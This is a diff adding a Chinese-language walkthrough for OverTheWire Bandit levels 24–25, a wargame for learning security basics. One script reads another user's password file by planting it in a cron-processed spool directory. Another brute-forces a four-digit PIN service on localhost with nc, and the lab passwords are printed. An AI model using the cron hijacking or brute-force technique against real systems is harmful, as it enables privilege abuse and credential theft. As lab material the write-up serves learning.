@@ -391,15 +391,49 @@ do
     fi
 ```
 
+在临时目录 `/tmp/tmp.QoI9PoOmYr` 创建一个脚本 `steal.sh`：
+```sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.QoI9PoOmYr/pass
+```
+
+```sh
+bandit23@bandit:/tmp/tmp.QoI9PoOmYr$ chmod 777 .
+bandit23@bandit:/tmp/tmp.QoI9PoOmYr$ chmod 777 steal.sh
+bandit23@bandit:/tmp/tmp.QoI9PoOmYr$ cp steal.sh /var/spool/bandit24/foo
+```
+
+等待定时任务触发后，临时目录下的 `pass` 中的字符串即为密码。
+
+密码为 `hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv`
+
+## Level 25
+```sh
+bandit24@bandit:~$ mktemp -d
+/tmp/tmp.nyPzsZmdaF
+bandit24@bandit:~$ cd /tmp/tmp.nyPzsZmdaF
+bandit24@bandit:/tmp/tmp.nyPzsZmdaF$ echo {0000..9999} > pincodes
+```
+
+随后执行以下脚本：
 ```sh
 #!/bin/bash
 
-tmp="/tmp/tmp.QoI9PoOmYr"
+bandit24="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"
 
-cd "$tmp"
-echo "cd into $tmp"
-
-cp /etc/bandit_pass/bandit24 .
-chmod 666 bandit24
-cat bandit24
+for i in $(cat pincodes); do
+	echo "$bandit24 $i" >> brute
+done
 ```
+
+得到形如 `hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 1573` 的暴力枚举序列。
+
+```sh
+bandit24@bandit:/tmp/tmp.nyPzsZmdaF$ cat brute | nc localhost 30002 > response
+...
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Correct!
+The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
+```
+密码为 `SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P`
